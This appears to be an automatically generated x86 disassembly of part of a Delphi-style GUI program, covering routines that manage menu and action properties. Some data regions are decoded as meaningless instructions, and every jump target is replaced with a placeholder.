add [ eax ] al
add [ eax ] dl
sub [ ecx ] al
call 0xfffffffff444dda1
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
inc ecx
add [ eax ] dl
movsb [ edi ] [ esi ]
inc esp
add [ esp ] ah
inc esp
add [ eax ] bh
movsb [ edi ] [ esi ]
inc esp
add [ esp + 0x44 ] cl
add [ eax - 0x5c ] ah
inc esp
add [ esp + 0x44 ] dh
add [ eax - 0x63ffbb5c ] cl
movsb [ edi ] [ esi ]
inc esp
add [ eax - 0x3bffbb5c ] dh
movsb [ edi ] [ esi ]
inc esp
add al bl
movsb [ edi ] [ esi ]
inc esp
add ah bl
movsb [ edi ] [ esi ]
inc esp
add al ah
movsb [ edi ] [ esi ]
inc esp
add ah ah
movsb [ edi ] [ esi ]
inc esp
add al ch
movsb [ edi ] [ esi ]
inc esp
add ah ch
movsb [ edi ] [ esi ]
inc esp
add al dh
movsb [ edi ] [ esi ]
inc esp
add ah dh
movsb [ edi ] [ esi ]
inc esp
add al bh
movsb [ edi ] [ esi ]
inc esp
add ah bh
movsb [ edi ] [ esi ]
inc esp
add [ eax ] al
movsd [ edi ] [ esi ]
inc esp
add [ 0x540b0044 ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x19e85653
cwde
sti
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
sub_449e0c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aa30
test bl bl
jle r-xdata
mov edx esi
call sub_44a220
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_449e7c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a544
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_449f24
sub_449eb0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449e40
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413cd4
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_413e60
sub_449ef8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404480
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_4040c8
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_449f24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44a220
mov edx ebx
mov eax esi
call sub_44a200
sub_449f4c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_449f24
sub_449f78
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45f274
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_40349c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41aabc
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_43ace0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_449fd0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45f29c
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_40349c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41aad8
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_43ace0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a028
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a0e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44a1ac
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_44a094
push ebx
push esi
push edi
call sub_40362c
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_4032a0
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413ecc
call sub_4032a0
mov eax [ edi + 0x30 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41a130
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403614
sub_44a0e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44a12c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413e40
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403450
mov edx edi
call sub_449eb0
sub_44a178
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44bed4
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44bf18
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_41a1b4
sub_44a1b8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a400
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_44a220
sub_44a200
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413c88
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_41a1b4
pop esi
pop ebx
retn
sub_44a220
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413f80
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44a23c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44a2a4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_45514c
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_44d770
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44ab4c
mov edx ebp
call sub_44abac
inc eax
je r-xdata
sub_44a330
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44a350
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44a370
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_44a7c0
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_44a7c0
sub_44a508
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a9ec
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_44a55c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_4032a0
mov eax [ esi + 0x9c ]
call sub_4032a0
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_449e0c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d01c
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_44a5ac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414518
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_44a658
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_44a6b8
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_44a7c0
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_44a8f8
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44a958
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_44a9b4
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_44aa18
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a658
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404480
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_4040c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403450
test eax eax
je r-xdata
sub_44a6b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44a7b0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44a170
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403450
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_44a15c
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_44a6b8
sub_44a7c0
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403450
test eax eax
je r-xdata
sub_44a838
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404480
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_4040c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413de4
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413de4
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
sub_44a8a0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403450
test eax eax
je r-xdata
sub_44a8f8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404480
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_4040c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403450
test eax eax
je r-xdata
sub_44a958
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403450
test eax eax
je r-xdata
sub_44a9b4
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403450
test eax eax
je r-xdata
sub_44aa18
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_413de4
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403450
test eax eax
je r-xdata
sub_44aa78
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404480
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_41a63c
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_44a658
sub_44aac4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44aaec
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_449f78
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_44a6b8
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44ab80
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_415884
mov edi eax
mov eax esi
call sub_44da5c
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44abac
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44abf0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44ac15
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ac1c
retn
sub_44ac50
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
lodsb [ esi ]
inc esp
add [ eax + 0x100044ac ] ah
add [ eax ] al
add [ eax - 0x17ffbff0 ] ah
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
mov [ fs : eax + eax + 0x1 ] 0x98ffff00
mov [ eax + eax + 0xb ] 0x61684354
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add ecx [ 0x61724454 ]
ja r-xdata
insd
popad
push es
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
pushfd
lodsd [ esi ]
inc esp
popad
dec ecx
outsb
js r-xdata
inc esp
add [ ecx ] al
or edx [ ecx + ecx * 2 + 0x6d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esp + ebp * 4 + 0x64070044 ] ch
jae r-xdata
mov eax 0x20000000
retn
je r-xdata
imul esi [ ebp + ecx * 2 + 0x61 ] 0x49076b73
insd
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
add [ eax ] al
add [ eax ] al
lodsd [ esi ]
inc esp
add [ edi ] al
imul esi [ ecx + ecx * 2 + 0x6d ] 0x6656761
outsd
arpl [ ebp + 0x73 ] si
or ah [ ebx + esi * 2 + 0x53 ]
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + esi * 2 + 0x4e ] ah
outsd
jb r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x408d
scasb [ edi ]
inc esp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
or eax 0x72547364
popad
outsb
jae r-xdata
ror [ ebx - 0xd9e173a ] cl
cld
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 + 0x79e80f74 ] 0x87
sti
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
lodsb [ esi ]
daa
inc ecx
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
scasb [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
lodsd [ esi ]
inc esp
add al ch
lodsd [ esi ]
inc esp
add [ eax ] ch
add [ eax ] al
mov al 0x26
inc ecx
add [ eax + ebp * 4 + 0x41 ] dl
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
mov eax eax
add al 0xad
inc esp
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x6d ]
popad
push esp
jns r-xdata
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xad04c08b
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
or [ edi - 0x42cbffbc ] ch
inc esp
add [ eax + eax * 8 - 0x438bffbc ] bh
inc esp
add [ 0xffffffffa4000041 ] dh
inc ecx
add [ ebp + 0x41 ] al
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax - 0x52 ] ch
inc esp
add [ eax - 0x48 ] ch
inc esp
add [ edi + ebp * 4 + 0x44 ] dh
add [ eax - 0x3b ] dh
inc esp
add ah bh
lds eax [ eax + eax + 0x74 ]
mov esi 0x10044
out dx eax
inc [ esi + edi * 4 + 0x54100044 ]
inc ebx
jne r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
sub_44ae68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
